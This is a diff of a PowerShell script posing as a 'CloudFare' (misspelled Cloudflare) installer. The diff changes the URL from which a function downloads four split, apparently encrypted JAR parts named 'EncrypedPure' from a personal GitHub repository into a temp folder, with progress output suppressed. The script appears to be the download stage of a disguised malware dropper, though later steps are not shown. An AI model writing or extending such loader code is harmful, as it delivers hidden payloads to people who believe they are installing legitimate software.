@@ -1,4 +1,4 @@
-# CloudFare Installation v2.0
+﻿# CloudFare Installation v2.0
 $ErrorActionPreference = "Stop"
 $ProgressPreference = "SilentlyContinue"
 
@@ -46,7 +46,7 @@ function Download-JarParts {
     $parts = @(1, 2, 3, 4)
     
     foreach ($num in $parts) {
-        $url = "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part$num.jar"
+        $url = "https://raw.githubusercontent.com/davidrenand/repos/main/EncrypedPure.part$num.jar"
         $file = "$TempDir\EncrypedPure.part$num.jar"
         
         Log "Part $num : Downloading..."
